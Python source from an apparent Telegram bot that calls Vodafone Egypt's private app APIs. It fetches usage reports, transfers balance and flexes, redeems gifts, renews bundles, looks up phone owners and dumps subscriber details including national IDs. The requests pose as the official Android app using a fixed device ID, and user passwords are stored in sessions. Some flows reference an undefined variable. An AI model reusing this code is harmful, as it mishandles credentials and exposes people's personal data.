        # استخراج تاريخ تجديد الباقة وحساب الأيام المتبقية
        renewal_date, days_left = get_flex_renewal_info(number, token)
        if renewal_date:
            lines.append(f"📅 تاريخ تجديد باقة فليكس: {renewal_date}")
            lines.append(f"⏳ الأيام المتبقية حتى التجديد: {days_left} يوم")
        else:
            lines.append("📅 تاريخ تجديد باقة فليكس: غير محدد")
    else:
        lines.append("⚡ الفليكسات المتبقية: غير متوفرة")
        lines.append("📅 تاريخ التجديد: غير متوفر")

    lines.append("═" * 35)
    lines.append(f"🕐 وقت التقرير: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("تصلي على سيدنا محمد ﷺ")
    return "\n".join(lines)

def run_usage_report(user_id, message_id, session):
    """تشغيل التقرير الشامل (الذي يستبدل welcome message)"""
    try:
        bot.edit_message_text("⏳ جاري تحميل التقرير الشامل...", user_id, message_id)
        token = session['token']
        number = session['number']
        password = session['password']
        report = get_detailed_report(number, token, password)
        bot.edit_message_text(report, user_id, message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)

def run_refresh_balance(user_id, message_id, session):
    """وظيفة زر تحديث الرصيد (تستخدم التقرير الشامل)"""
    run_usage_report(user_id, message_id, session)

def run_flex_percentage(user_id, message_id, session):
    """الحصول على نسبة الفليكس"""
    try:
        result = get_flexes_balance(session['token'], session['number'])
        if result is None:
            text = "❌ لم نتمكن من جلب نسبة الفليكس."
        else:
            text = f"📊 نسبة الفليكس المتاحة: {result} فليكس"
        try:
            bot.edit_message_text(text, user_id, message_id)
        except:
            bot.send_message(user_id, text)
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ خطأ: {str(e)}")

def run_owner_number(user_id, message_id, session):
    """الحصول على رقم المالك"""
    try:
        result = get_owner_number_from_family_new(session['number'], session['password'])
        try:
            bot.edit_message_text(result, user_id, message_id)
        except:
            bot.send_message(user_id, result)
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ خطأ: {str(e)}")

def run_gifts_6_flow(user_id, message_id):
    """تشغيل هدايا 6"""
    session = get_user_session(user_id)
    if not session:
        bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
        return
    bot.edit_message_text("⏳ جاري تفعيل 6 هدايا...", user_id, message_id)
    Thread(target=lambda: run_gifts_6_execute(user_id, session['number'], session['password'], message_id)).start()

def run_500_units_flow(user_id, message_id):
    """تشغيل خدمة 500 وحدة متجددة"""
    session = get_user_session(user_id)
    if not session:
        bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
        return
    # نطلب رقم المستلم أولاً
    save_user_state(user_id, step="500_units_target", action="500_units",
                   data={'owner_number': session['number'], 'owner_password': session['password']})
    bot.edit_message_text("📱 أرسل رقم الهاتف الذي تريد إرسال الـ 500 وحدة إليه:", user_id, message_id)

def run_500_units_confirm(user_id, message_id, target_number):
    """عرض تأكيد قبل إرسال 500 وحدة"""
    state = get_user_state(user_id)
    if not state or state.get('step') != "500_units_target":
        bot.send_message(user_id, "❌ انتهت الجلسة!")
        return
    data = state['data']
    data['target_number'] = target_number
    save_user_state(user_id, step="500_units_confirm", action="500_units", data=data)
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("✅ تأكيد", callback_data="confirm_500_units"),
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
    )
    bot.edit_message_text(f"⚠️ تأكيد إرسال 500 وحدة إلى {target_number}\n\nهل أنت متأكد؟", user_id, message_id, reply_markup=keyboard)

def run_500_units_execute(user_id, message_id, owner_number, owner_password, target_number):
    """تنفيذ إرسال 500 وحدة"""
    result = send_500_units_gift(owner_number, owner_password, target_number)
    try:
        bot.edit_message_text(result, user_id, message_id)
    except:
        bot.send_message(user_id, result)
    clear_user_state(user_id)

def run_gifts_6_execute(user_id, number, password, original_msg_id):
    try:
        result = redeem_vodafone_gifts_6(number, password)
        try:
            bot.edit_message_text(result, user_id, original_msg_id)
        except:
            bot.send_message(user_id, result)
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, original_msg_id)
        except:
            bot.send_message(user_id, f"❌ خطأ: {str(e)}")

def run_plus_discount_execute(user_id, number, password, original_msg_id):
    # تم استبدالها بـ 500 وحدة، لن نستخدمها بعد الآن
    pass

def run_balance_transfer_menu(user_id, message_id):
    """عرض قائمة تحويل الرصيد"""
    session = get_user_session(user_id)
    if not session:
        bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
        return
    
    try:
        bot.edit_message_text("💰 تحويل الرصيد\n\nاختر الخدمة المطلوبة:", user_id, message_id, reply_markup=create_balance_transfer_menu())
    except:
        bot.send_message(user_id, "💰 تحويل الرصيد\n\nاختر الخدمة المطلوبة:", reply_markup=create_balance_transfer_menu())

def run_balance_transfer_new(user_id, message_id):
    """بدء تحويل رصيد جديد (بدون التحقق من الرصيد)"""
    session = get_user_session(user_id)
    if not session:
        bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
        return
    
    save_user_state(user_id, step="bt_waiting_for_receiver", action="balance_transfer",
                   data={'sender_number': session['number'], 'password': session['password'], 'token': session['token']})
    
    try:
        bot.edit_message_text("📱 أرسل رقم المستلم (11 رقم يبدأ بـ 01):", user_id, message_id)
    except:
        bot.send_message(user_id, "📱 أرسل رقم المستلم (11 رقم يبدأ بـ 01):")

def run_balance_transfer_history(user_id, message_id):
    """عرض سجل التحويلات"""
    history = get_balance_transfer_history(user_id)
    if not history:
        text = "📜 لا يوجد سجل تحويلات بعد."
    else:
        text = "📜 آخر 10 تحويلات:\n\n"
        for sender, receiver, amount, fees, status, timestamp in history:
            text += f"📤 من: {sender}\n📥 إلى: {receiver}\n💰 المبلغ: {amount} جنيه\n💸 الرسوم: {fees} جنيه\n📊 الحالة: {status}\n🕐 {timestamp.strftime('%Y-%m-%d %H:%M')}\n━━━━━━━━━━━━\n"
    
    try:
        bot.edit_message_text(text, user_id, message_id, reply_markup=create_balance_transfer_menu())
    except:
        bot.send_message(user_id, text, reply_markup=create_balance_transfer_menu())

def run_balance_transfer_check(user_id, message_id, receiver_number):
    """التحقق من رقم المستلم (تم تعديلها لإزالة التحقق من الرصيد)"""
    state = get_user_state(user_id)
    if not state:
        return
    
    data = state['data']
    data['receiver_number'] = receiver_number
    save_user_state(user_id, step="bt_waiting_for_amount", action="balance_transfer", data=data)
    
    try:
        bot.edit_message_text("💰 أرسل المبلغ المراد تحويله (الحد الأقصى 50 جنيه):", user_id, message_id)
    except:
        bot.send_message(user_id, "💰 أرسل المبلغ المراد تحويله (الحد الأقصى 50 جنيه):")

def run_balance_transfer_amount(user_id, message_id, amount):
    """معالجة المبلغ المدخل (بدون التحقق من الرصيد)"""
    state = get_user_state(user_id)
    if not state:
        return
    
    data = state['data']
    sender_number = data['sender_number']
    receiver_number = data['receiver_number']
    
    try:
        amount = float(amount)
        if amount <= 0 or amount > 50:
            bot.edit_message_text("❌ المبلغ غير صحيح! يجب أن يكون بين 1 و 50 جنيه.\nأعد إرسال المبلغ:", user_id, message_id)
            return
    except:
        bot.edit_message_text("❌ المبلغ غير صحيح! أعد إرسال المبلغ:", user_id, message_id)
        return
    
    data['amount'] = amount
    save_user_state(user_id, step="bt_waiting_for_confirmation", action="balance_transfer", data=data)
    
    fees_text = f"""
💰 تفاصيل التحويل:

• الرقم المستلم: {receiver_number}
• المبلغ المراد تحويله: {amount} جنيه
• رسوم التحويل (2% بحد أدنى 0.2 جنيه): سيتم خصمها من الرصيد
• سيتم إرسال كود التفعيل لهاتفك

هل تريد تأكيد التحويل؟
    """
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("✅ تأكيد", callback_data="bt_confirm"),
        InlineKeyboardButton("❌ إلغاء", callback_data="bt_cancel")
    )
    
    bot.edit_message_text(fees_text, user_id, message_id, reply_markup=keyboard)

def run_balance_transfer_confirm(user_id, message_id):
    """تأكيد التحويل وطلب الكود"""
    state = get_user_state(user_id)
    if not state:
        return
    
    data = state['data']
    sender_number = data['sender_number']
    password = data['password']
    receiver_number = data['receiver_number']
    amount = data['amount']
    token = data['token']
    
    bt = VodafoneBalanceTransfer(token, sender_number)
    
    bot.edit_message_text("📤 جاري إرسال طلب التحويل...", user_id, message_id)
    
    if bt.request_transfer(receiver_number, amount):
        data['step'] = "bt_waiting_for_code"
        save_user_state(user_id, step="bt_waiting_for_code", action="balance_transfer", data=data)
        
        bot.edit_message_text(
            "✅ تم إرسال طلب التحويل بنجاح!\n\n📲 سيصلك كود التحقق (8 أرقام) على هاتفك قريباً\n\nأدخل كود التحقق:",
            user_id, message_id,
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔄 إعادة إرسال الكود", callback_data="bt_resend_code"),
                InlineKeyboardButton("❌ إلغاء", callback_data="bt_cancel")
            )
        )
    else:
        bot.edit_message_text("❌ فشل في إرسال طلب التحويل!", user_id, message_id)
        clear_user_state(user_id)

def run_balance_transfer_resend(user_id, message_id):
    """إعادة إرسال كود التحقق"""
    state = get_user_state(user_id)
    if not state:
        return
    
    data = state['data']
    sender_number = data['sender_number']
    password = data['password']
    receiver_number = data['receiver_number']
    amount = data['amount']
    token = data['token']
    
    bt = VodafoneBalanceTransfer(token, sender_number)
    
    bot.edit_message_text("🔄 جاري إعادة إرسال كود التحقق...", user_id, message_id)
    
    if bt.request_transfer(receiver_number, amount):
        bot.edit_message_text(
            "✅ تم إعادة إرسال كود التحقق بنجاح!\n\n📲 أدخل كود التحقق الجديد:",
            user_id, message_id,
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔄 إعادة إرسال الكود", callback_data="bt_resend_code"),
                InlineKeyboardButton("❌ إلغاء", callback_data="bt_cancel")
            )
        )
    else:
        bot.edit_message_text("❌ فشل في إعادة إرسال الكود!", user_id, message_id)
        clear_user_state(user_id)

def run_balance_transfer_code(user_id, message_id, code):
    """تأكيد التحويل بالكود"""
    state = get_user_state(user_id)
    if not state:
        return
    
    data = state['data']
    sender_number = data['sender_number']
    receiver_number = data['receiver_number']
    amount = data['amount']
    token = data['token']
    
    if len(code) != 8 or not code.isdigit():
        bot.edit_message_text("❌ كود التحقق يجب أن يكون 8 أرقام!\nأعد إدخال الكود:", user_id, message_id)
        return
    
    bt = VodafoneBalanceTransfer(token, sender_number)
    
    bot.edit_message_text("✅ جاري تأكيد وتحويل الرصيد...", user_id, message_id)
    
    result = bt.confirm_transfer(receiver_number, amount, code)
    
    if result["success"]:
        # حساب الرسوم بشكل تقريبي للتسجيل
        fees = amount * 0.02
        if fees < 0.2:
            fees = 0.2
        add_balance_transfer_history(user_id, sender_number, receiver_number, amount, fees, "ناجح")
        
        bot.edit_message_text(
            f"🎉 {result['message']}\n\n✅ تمت العملية بنجاح!\n\n💰 المبلغ المحول: {amount} جنيه\n📱 إلى: {receiver_number}",
            user_id, message_id
        )
        clear_user_state(user_id)
    else:
        if result.get("invalid_code", False):
            bot.edit_message_text(
                "❌ كود التحقق غير صحيح!\nأعد إدخال الكود:",
                user_id, message_id,
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔄 إعادة إرسال الكود", callback_data="bt_resend_code"),
                    InlineKeyboardButton("❌ إلغاء", callback_data="bt_cancel")
                )
            )
        else:
            bot.edit_message_text(f"❌ {result['message']}", user_id, message_id)
            clear_user_state(user_id)

def run_balance_transfer_cancel(user_id, message_id):
    """إلغاء عملية التحويل"""
    clear_user_state(user_id)
    try:
        bot.edit_message_text("❌ تم إلغاء عملية تحويل الرصيد.", user_id, message_id, reply_markup=create_balance_transfer_menu())
    except:
        bot.send_message(user_id, "❌ تم إلغاء عملية تحويل الرصيد.", reply_markup=create_balance_transfer_menu())

def run_discount_offers(user_id, message_id, session):
    """عرض عروض الخصم"""
    offers, login_data = get_all_discount_offers(session['number'], session['password'])
    
    if isinstance(offers, str) and offers.startswith("❌"):
        try:
            bot.edit_message_text(offers, user_id, message_id)
        except:
            bot.send_message(user_id, offers)
        return
    
    if not offers:
        try:
            bot.edit_message_text("💰 لا توجد عروض خصم متاحة حالياً.", user_id, message_id)
        except:
            bot.send_message(user_id, "💰 لا توجد عروض خصم متاحة حالياً.")
        return
    
    save_user_state(user_id, step="discount_offers", action="discount_offers",
                   data={'offers': offers, 'login_data': login_data})
    
    text = "💰 عروض الخصم المتاحة:\n\n"
    for i, offer in enumerate(offers[:10]):
        text += f"{i+1}. {offer.get('clean_desc', 'عرض خصم')}\n"
        if offer.get('price'):
            text += f"   {offer.get('price')}\n"
        text += "\n"
    
    if len(offers) > 10:
        text += f"⚠️ يوجد {len(offers) - 10} عروض إضافية غير معروضة\n\n"
    
    text += "اختر رقم العرض من القائمة أدناه:"
    
    markup = create_discount_offers_menu(offers)
    
    try:
        bot.edit_message_text(text, user_id, message_id, reply_markup=markup)
    except:
        bot.send_message(user_id, text, reply_markup=markup)

# ===== دالة تقرير الاستهلاك الشامل (مأخوذة من ملف تقرير الخط.py) =====
def get_usage_report(number, access_token):
    """جلب تقرير الاستهلاك من API فودافون"""
    url = (
        "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?"
        "%40type=aggregated&bucket.product.publicIdentifier=" + number
    )
    headers = {
        'User-Agent': "okhttp/4.9.3",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "usageConsumptionHost",
        'useCase': "aggregated",
        'Authorization': f"Bearer {access_token}",
        'api-version': "v2",
        'msisdn': number,
        'Content-Type': "application/json",
    }
    try:
        r = requests.get(url, headers=headers, timeout=30)
        if r.status_code == 200:
            return r.json()
        else:
            return None
    except Exception as e:
        logger.error(f"خطأ في جلب التقرير: {e}")
        return None

def extract_usage_data_simple(report_data):
    """استخراج البيانات بشكل بسيط ودقيق (نسخة محسنة) - مع إضافة وحدات فكة"""
    data = {
        'balance': '0',
        'flex_remaining': '0',
        'flex_valid_until': 'غير محدد',
        'family_minutes': '0',
        'facebook_mb': '0',
        'next_flex_limit': '0',
        'moneyback': '0',
        'fakka_units': '0'  # إضافة حقل لوحدات فكة
    }
    try:
        if not isinstance(report_data, list):
            return data
        for block in report_data:
            # Find balance (LE)
            if block.get("@type") == "Tariff":
                buckets = block.get("bucket", [])
                for bucket in buckets:
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining":
                            remaining = balance.get("remainingValue", {})
                            if remaining.get("units") == "LE":
                                data['balance'] = str(remaining.get("amount", "0"))
            # Find flex remaining
            if block.get("@type") == "Flex":
                for bucket in block.get("bucket", []):
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining" and balance.get("remainingValue", {}).get("units") == "FLEX":
                            data['flex_remaining'] = str(balance["remainingValue"].get("amount", "0"))
                            # Also get endDateTime
                            if "endDateTime" in balance:
                                date_str = balance["endDateTime"]
                                if 'T' in date_str:
                                    data['flex_valid_until'] = date_str.split('T')[0]
            # Find family minutes
            if block.get("@type") == "Family":
                for bucket in block.get("bucket", []):
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining" and balance.get("remainingValue", {}).get("units") == "MIN":
                            data['family_minutes'] = str(balance["remainingValue"].get("amount", "0"))
            # Find facebook MB
            if block.get("@type") == "Social":
                for bucket in block.get("bucket", []):
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining" and balance.get("remainingValue", {}).get("units") == "MB":
                            data['facebook_mb'] = str(balance["remainingValue"].get("amount", "0"))
            # Find next flex limit (maybe in OTHERS with usageType limit)
            if block.get("@type") == "OTHERS":
                for bucket in block.get("bucket", []):
                    if bucket.get("usageType") == "limit":
                        for balance in bucket.get("bucketBalance", []):
                            if balance.get("@type") == "Remaining" and balance.get("remainingValue", {}).get("units") == "FLEX":
                                data['next_flex_limit'] = str(balance["remainingValue"].get("amount", "0"))
            # Find moneyback
            if block.get("@type") == "OTHERS":
                for bucket in block.get("bucket", []):
                    if bucket.get("usageType") == "money":
                        for balance in bucket.get("bucketBalance", []):
                            if balance.get("@type") == "Remaining" and balance.get("remainingValue", {}).get("units") == "Money":
                                data['moneyback'] = str(balance["remainingValue"].get("amount", "0"))
            # Find fakka units (افترضنا usageType = "fakka" أو "card")
            if block.get("@type") == "OTHERS":
                for bucket in block.get("bucket", []):
                    if bucket.get("usageType") in ["fakka", "card"]:
                        for balance in bucket.get("bucketBalance", []):
                            if balance.get("@type") == "Remaining":
                                data['fakka_units'] = str(balance["remainingValue"].get("amount", "0"))
        return data
    except Exception as e:
        logger.error(f"Error extracting usage data: {e}")
        return data

def format_usage_report(phone_number, data):
    """تنسيق تقرير الاستهلاك للعرض في البوت"""
    result = f"📊 تقرير الاستهلاك الشامل (Vodafone) 📱\n"
    result += "═" * 30 + "\n"
    result += f"• رقم الهاتف: {phone_number}\n"
    result += "─" * 30 + "\n"
    
    # عرض البيانات
    if data['balance'] != '0':
        result += f"💰 الرصيد الحالي: {data['balance']} جنيه\n"
    if data['flex_remaining'] != '0':
        flex_text = data['flex_remaining'] + " فليكس"
        if data['flex_valid_until'] != 'غير محدد':
            flex_text += f" (حتى {data['flex_valid_until']})"
        result += f"⚡ الفليكسات الحالية المتبقية: {flex_text}\n"
    if data['family_minutes'] != '0':
        result += f"👨‍👩‍👧‍👦 دقائق العائلة المتبقية: {data['family_minutes']} دقيقة\n"
    if data['facebook_mb'] != '0':
        result += f"📘 ميجات الفيسبوك المتبقية: {data['facebook_mb']} ميجابايت\n"
    if data['next_flex_limit'] != '0':
        result += f"📈 حد فليكس للدورة القادمة: {data['next_flex_limit']} فليكس\n"
    if data['moneyback'] != '0':
        result += f"💸 رصيد الماني باك المتبقي: {data['moneyback']} جنيه\n"
    if data['fakka_units'] != '0':
        result += f"🃏 وحدات فكة المتبقية: {data['fakka_units']} وحدة\n"
    
    result += "─" * 30 + "\n"
    result += f"🕐 تاريخ التقرير: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    result += "═" * 30 + "\n"
    result += "تصلي على سيدنا محمد ﷺ"
    
    return result

def run_usage_report(user_id, message_id, session):
    """تشغيل تقرير الاستهلاك الشامل"""
    try:
        bot.edit_message_text("⏳ جاري تحميل التقرير...", user_id, message_id)
        token = session['token']
        number = session['number']
        
        report_data = get_usage_report(number, token)
        if not report_data:
            bot.edit_message_text("❌ فشل في جلب التقرير!", user_id, message_id)
            return
        
        extracted = extract_usage_data_simple(report_data)
        text = format_usage_report(number, extracted)
        bot.edit_message_text(text, user_id, message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)

# ===== دوال جديدة لتحويل الفليكسات (مضافة) =====
def run_flex_transfer_menu(user_id, message_id):
    """عرض قائمة تحويل الفليكسات"""
    session = get_user_session(user_id)
    if not session:
        # لا يمكن استخدام call هنا، نرسل رسالة مباشرة
        bot.send_message(user_id, "❌ يجب تسجيل الدخول أولاً!")
        return
    save_user_state(user_id, step="flex_transfer_receiver", action="flex_transfer",
                   data={'sender_number': session['number'], 'token': session['token']})
    bot.send_message(user_id, "📱 أرسل رقم المستلم (11 رقم يبدأ بـ 01):")

def run_flex_transfer_amount(user_id, message_id, receiver_number):
    """استقبال رقم المستلم وطلب المبلغ"""
    state = get_user_state(user_id)
    if not state:
        return
    data = state['data']
    data['receiver_number'] = receiver_number
    save_user_state(user_id, step="flex_transfer_amount", action="flex_transfer", data=data)
    bot.send_message(user_id, "💰 أرسل المبلغ المراد تحويله (فليكسات):")

def run_flex_transfer_confirm(user_id, message_id, amount):
    """تأكيد التحويل وتنفيذه"""
    state = get_user_state(user_id)
    if not state:
        return
    data = state['data']
    sender_number = data['sender_number']
    token = data['token']
    receiver_number = data['receiver_number']
    try:
        amount_float = float(amount)
    except:
        bot.send_message(user_id, "❌ المبلغ غير صحيح. أعد إرسال المبلغ:")
        return
    bot.send_message(user_id, "⏳ جاري تحويل الفليكسات...")
    success, msg = execute_flex_transfer(sender_number, token, receiver_number, amount_float)
    bot.send_message(user_id, msg, parse_mode='HTML')
    clear_user_state(user_id)

# ===== دوال جديدة للبحث عن الأرقام (تروكولر) =====
def run_truecaller_search(user_id, message_id, phone):
    """تنفيذ البحث عن الرقم"""
    result = search_phone_number(phone)
    try:
        bot.edit_message_text(result, user_id, message_id)
    except:
        bot.send_message(user_id, result)
    clear_user_state(user_id)

# ===== دالة جديدة لبيانات الخط (مطورة من ملف بيانات الخط جديد.py) مع حل مشكلة "message is not modified" =====
def run_user_data(user_id, message_id, session):
    """جلب وعرض جميع بيانات المستخدم (الخط) بشكل مفصل باستخدام VodafoneAccount"""
    try:
        # محاولة حذف الرسالة المؤقتة لتجنب خطأ "message is not modified"
        try:
            bot.delete_message(user_id, message_id)
        except:
            pass  # إذا فشل الحذف، نكمل
        
        # إرسال رسالة جديدة بالبيانات
        number = session['number']
        password = session['password']
        
        voda = VodafoneAccount()
        if not voda.login(number, password):
            bot.send_message(user_id, "❌ فشل تسجيل الدخول!")
            return
        
        result_text = f"📋 **بيانات الخط الكاملة**\n"
        result_text += "═" * 35 + "\n"
        result_text += f"📱 الرقم: {number}\n\n"
        
        # 1. معلومات من التوكن
        user_info = voda.get_account_info()
        if user_info:
            result_text += "**🔐 معلومات أساسية:**\n"
            result_text += f"   • الاسم: {user_info.get('firstName', '')} {user_info.get('lastName', '')}\n"
            result_text += f"   • رقم العميل: {user_info.get('customerID', 'غير معروف')}\n"
            result_text += f"   • رقم الحساب: {user_info.get('accountNumber', 'غير معروف')}\n\n"
        
        # 2. معلومات خدمة الحساب
        service = voda.get_service_account()
        if service and isinstance(service, list) and len(service) > 0:
            service_data = service[0]
            result_text += "**📊 معلومات الحساب:**\n"
            contract_id = service_data.get("IDs", [{}])[0].get("value", "غير متوفر")
            result_text += f"   • رقم العقد: {contract_id}\n"
            
            for cat in service_data.get("categories", []):
                if cat.get("listHirarchyId") == "CustomerType":
                    result_text += f"   • نوع العميل: {cat.get('value', 'غير معروف')}\n"
                    break
            
            balance = next((bal["amount"]["value"] for bal in service_data.get("accountBalance", []) 
                           if bal.get("balanceType") == "LoyaltyAmount"), "0")
            result_text += f"   • الرصيد: {balance} جنيه\n"
            
            if 'contact' in service_data and len(service_data['contact']) > 0:
                contact = service_data['contact'][0]
                first_name = contact.get("contactFirstName", "غير متوفر")
                last_name = contact.get("contactLastName", "غير متوفر")
                result_text += f"   • الاسم: {first_name} {last_name}\n"
                
                national_id = contact.get("nationalID", "غير متوفر")
                result_text += f"   • الرقم القومي: {national_id}\n"
                
                if 'contactMedium' in contact and len(contact['contactMedium']) > 0:
                    city = contact['contactMedium'][0].get("city", "غير متوفر")
                    result_text += f"   • المدينة: {city}\n"
            
            if 'statusHistory' in service_data and len(service_data['statusHistory']) > 0:
                status = service_data['statusHistory'][0].get("status", "غير متوفر")
                result_text += f"   • حالة الخط: {status}\n\n"
        
        # 3. الرصيد التفصيلي
        balance_info = voda.get_balance()
        if balance_info and 'balances' in balance_info:
            result_text += "**💰 تفاصيل الرصيد:**\n"
            for balance in balance_info['balances'][:3]:
                balance_type = balance.get('balanceType', '')
                amount = balance.get('amount', {})
                value = amount.get('value', '0')
                unit = amount.get('unit', 'EGP')
                result_text += f"   • {balance_type}: {value} {unit}\n"
            result_text += "\n"
        
        # 4. الاشتراكات
        subscriptions = voda.get_subscriptions()
        if subscriptions and isinstance(subscriptions, list) and len(subscriptions) > 0:
            result_text += "**📜 الاشتراكات:**\n"
            for sub in subscriptions[:5]:
                name = sub.get('name', 'غير معروف')
                status = sub.get('status', 'غير معروف')
                result_text += f"   • {name} - الحالة: {status}\n"
            result_text += "\n"
        
        # 5. العروض
        offers_info = voda.get_offers()
        if offers_info and 'offers' in offers_info:
            result_text += "**🎁 العروض المتاحة:**\n"
            for offer in offers_info['offers'][:3]:
                name = offer.get('name', 'عرض بدون اسم')
                price = offer.get('price', {}).get('taxIncludedAmount', {}).get('value', '0')
                validity = offer.get('validity', 'غير معروف')
                result_text += f"   • {name} - السعر: {price} جنيه\n"
            result_text += "\n"
        
        result_text += "═" * 35 + "\n"
        result_text += f"🕐 وقت التقرير: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        result_text += "تصلي على سيدنا محمد ﷺ"
        
        bot.send_message(user_id, result_text, parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ: {str(e)}")

# ===== دوال جديدة لتجديد الباقة (مأخوذة من ملف تجديد الباقة 😁🔥.py) =====
def get_flex_products_mobile(msisdn, token):
    """جلب منتجات Flex باستخدام API الموبايل"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    params = {
        'relatedParty.id': msisdn,
        '@type': "FlexProfile"
    }
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "FlexProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2026.1.1",
        'x-agent-build': "1090",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.raise_for_status()
        products = response.json()
        return products
    except Exception as e:
        logger.error(f"❌ فشل جلب منتجات Flex: {e}")
        return None

def is_main_bundle(bundle):
    """التحقق إذا كانت الباقة هي الباقة الرئيسية"""
    bundle_id = bundle.get('id', '')
    bundle_name = bundle.get('productSpecification', {}).get('name', '')
    flex_pattern = r'Flex_20\d{2}_\d+'
    if re.search(flex_pattern, bundle_id):
        return True
    main_keywords = ['فليكس', 'Flex', 'باقة']
    name_match = any(keyword in bundle_name for keyword in main_keywords)
    has_price = len(bundle.get('productPrice', [])) > 0
    return name_match and has_price

def find_main_bundle_auto(products):
    """البحث التلقائي عن الباقة الرئيسية"""
    main_bundles = []
    for product in products:
        if product.get('productPrice'):
            product_id = product.get('id')
            product_name = product.get('productSpecification', {}).get('name', '')
            enc_id = product.get('productOffering', {}).get('encProductId')
            description = product.get('description', '')
            prices = []
            for price in product.get('productPrice', []):
                if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                    prices.append({
                        'value': price['price']['taxIncludedAmount']['value'],
                        'type': price.get('priceType'),
                        'period': price.get('recurringChargePeriod')
                    })
            bundle_info = {
                'id': product_id,
                'name': product_name,
                'description': description,
                'encProductId': enc_id,
                'prices': prices,
                'full_product': product
            }
            main_bundles.append(bundle_info)
    
    if not main_bundles:
        return None
    
    selected_bundle = None
    for bundle in main_bundles:
        if is_main_bundle(bundle):
            selected_bundle = bundle
            break
    
    if not selected_bundle and main_bundles:
        sorted_bundles = sorted(main_bundles, 
                               key=lambda x: float(x['prices'][0]['value']) if x['prices'] else 0, 
                               reverse=True)
        selected_bundle = sorted_bundles[0]
    
    return selected_bundle

def renew_flex_bundle_mobile(msisdn, token, bundle):
    """تجديد باقة Flex باستخدام API الموبايل"""
    bundle_id = bundle['id']
    bundle_name = bundle['name']
    enc_product_id = bundle['encProductId']
    price_info = f" ({bundle['prices'][0]['value']} جنيه)" if bundle['prices'] else ""
    
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "repurchase",
            "product": {
                "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}],
                "id": bundle_id,
                "encProductId": enc_product_id
            }
        }],
        "@type": "FlexRenew"
    }
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductOrderingManagementHost",
        'useCase': "FlexRenew",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2026.1.1",
        'x-agent-build': "1090",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        # تعديل: قبول 200 و 201 كنجاح
        if response.status_code in [200, 201]:
            return True, "✅ تم تجديد باقة فليكس بنجاح!"
        elif response.status_code == 400:
            try:
                result = response.json()
                error_code = result.get('code')
                error_reason = result.get('reason')
                if error_code == "2255" and "Grace period" in error_reason:
                    return False, "❌ الرقم في فترة السماح (لا يوجد رصيد كافٍ)"
                else:
                    return False, f"❌ فشل التجديد: {error_reason}"
            except:
                return False, f"❌ فشل التجديد (كود {response.status_code})"
        else:
            return False, f"❌ خطأ غير متوقع: {response.status_code}"
    except Exception as e:
        return False, f"❌ خطأ في الاتصال: {str(e)}"

def run_renew_bundle(user_id, message_id, session):
    """تنفيذ تجديد الباقة للمستخدم المسجل"""
    try:
        bot.edit_message_text("⏳ جاري تجهيز بيانات الباقة...", user_id, message_id)
        number = session['number']
        password = session['password']
        
        token = get_fresh_token(number, password)
        if token.startswith("ERROR:"):
            bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, message_id)
            return
        
        products = get_flex_products_mobile(number, token)
        if not products:
            bot.edit_message_text("❌ فشل جلب معلومات الباقات!", user_id, message_id)
            return
        
